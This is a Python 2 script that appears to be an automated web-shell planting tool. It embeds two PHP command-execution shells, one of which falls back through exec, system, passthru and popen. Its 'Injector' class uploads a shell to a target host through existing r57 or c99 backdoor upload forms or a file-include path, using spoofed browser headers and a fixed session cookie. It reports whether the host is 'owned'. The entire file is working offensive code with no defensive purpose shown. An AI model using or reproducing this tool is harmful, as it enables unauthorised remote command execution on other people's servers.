import httplib, mimetypes, random, threading


class Injector(threading.Thread):
    global cmd1
    cmd1="""<html>
   <body>
   <?php
   $md=$_GET['cmd'];
   if (isset($chdir)) @chdir($chdir);
   ob_start();
   system("$md 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp");
   $output = ob_get_contents();
   ob_end_clean();
   if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
   ?>
   </body>
   </html>
   """
    global cmd
    cmd="""
    <?php
    function myshellexec($cmd)
    {
    global $disablefunc;
    $result = ""; 
    if (!empty($cmd))
    {
    if (is_callable("exec") and !in_array("exec",$disablefunc)) 
    {exec($cmd,$result); $result = join("\n",$result);}
  
     elseif (($result = `$cmd`) !== FALSE) {}
     elseif (is_callable("system") and !in_array("system",$disablefunc)) 
     {$v = @ob_get_contents(); @ob_clean(); system($cmd); 
      $result = @ob_get_contents(); @ob_clean(); echo $v;}
  
     elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) 
     {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); 
      $result = @ob_get_contents(); @ob_clean(); echo $v;}
  
     elseif (is_resource($fp = popen($cmd,"r")))
     {
     $result = "";
     while(!feof($fp)) {$result .= fread($fp,1024);}
     pclose($fp);
     }
    }
    return $result;
    }

    $md=$_GET['cmd'];
    print myshellexec($md);
    ?>
    """

   
    def __init__(self, host, backdoor, exploit, filename, include):
        threading.Thread.__init__(self)
        self.host = host
        self.backdoor = backdoor
        self.exploit = exploit
        self.filename = filename
        self.include = include

        
    def post_multipart(self, host, selector, fields, files, mode):
        """
        Post fields and files to an http host as multipart/form-data.
        fields is a sequence of (name, value) elements for regular form fields.
        files is a sequence of (name, filename, value) elements for data to be uploaded as files
        Return the server's response page.
        """
        if mode=='r57':
            data=self.encode_multipart_formdata_r57(fields, files)
        elif mode =='c99':
            data=self.encode_multipart_formdata_c99(fields, files)
        else:
            data=self.encode_multipart_formdata_c99(fields, files)
        
            
        content_type, body = data
        h = httplib.HTTP(host)
        h.putrequest('POST', selector)
        h.putheader('HOST', host)
        h.putheader('User-Agent', "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9")
        h.putheader('Accept', "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5")
        h.putheader('Accept-Language', "fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3")
        h.putheader('Accept-Encoding', "gzip,deflate")
        h.putheader('Accept-Charset', "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
        h.putheader('Keep-Alive', '300')
        h.putheader('Connection', "keep-alive")
        h.putheader('Referer', "www.nice.com")
        h.putheader('Cookie', "PHPSESSID=29d6f7b6bc7c288aa346735fc24d2f87; hotlog=1")
        h.putheader('content-type', content_type)
        h.putheader('content-length', str(len(body)))
        h.endheaders()
        h.send(body)
        errcode, errmsg, headers = h.getreply()
        return h.file.read()

    def encode_multipart_formdata_r57(self,fields, files):
        """
        fields is a sequence of (name, value) elements for regular form fields.
        files is a sequence of (name, filename, value) elements for data to be uploaded as files
        Return (content_type, body) ready for httplib.HTTP instance
        """
        bound=random.randrange(1000000000000,10000000000000)
        BOUNDARY = '-----------------------------'+str(bound)
        CRLF = '\r\n'
        L = []
        for (key, filename, value) in files:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
            L.append('Content-Type: %s' % self.get_content_type(filename))
            L.append('')
            L.append(value)
        for (key, value) in fields:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"' % key)
            L.append('')
            L.append(value)    
        L.append('--' + BOUNDARY + '--')
        L.append('')
        body = CRLF.join(L)
        content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
        return content_type, body
        
        

    def encode_multipart_formdata_c99(self,fields, files):
        """
        fields is a sequence of (name, value) elements for regular form fields.
        files is a sequence of (name, filename, value) elements for data to be uploaded as files
        Return (content_type, body) ready for httplib.HTTP instance
        """
        bound=random.randrange(1000000000000,10000000000000)
        BOUNDARY = '-----------------------------'+str(bound)
        CRLF = '\r\n'
        L = []
        
        for (key, value) in [fields[0]]:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"' % key)
            L.append('')
            L.append(value)
        for (key, filename, value) in files:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
            L.append('Content-Type: %s' % self.get_content_type(filename))
            L.append('')
            L.append(value)
        for (key, value) in fields[1:]:
            L.append('--' + BOUNDARY)
            L.append('Content-Disposition: form-data; name="%s"' % key)
            L.append('')
            L.append(value)
        L.append('--' + BOUNDARY + '--')
        L.append('')
        body = CRLF.join(L)
        content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
        return content_type, body


    def get_content_type(self, filename):
        return mimetypes.guess_type(filename)[0] or 'application/octet-stream'



    def run(self):
        try:
            fields, userfile='', ''
            if self.host != '' and self.backdoor != '' and self.exploit != '' and self.filename !='':
                if self.backdoor=="r57":
                    fields=[('new_name',''),('dir','.'),('submit','Upload')]
                    userfile='userfile'
                elif self.backdoor=="c99":
                    fields=[('act','upload'),('miniform','1'),('submit','Upload')]
                    userfile='uploadfile'
                elif self.backdoor=="others":
                    fields=[('miniform','1')]
                    userfile='uploadedfile'
               
                selector="/"+self.exploit+'?page='+self.include

                files=[(userfile,self.filename,cmd)]
                data=self.post_multipart(self.host, selector, fields, files, self.backdoor)

                if self.backdoor=='r57' and data.find(self.filename) != -1:
                    return 'owned'
                elif self.backdoor=='r57' and data.find(self.filename) == -1:
                    return 'not owned'
        except Exception, e:
            print e

                


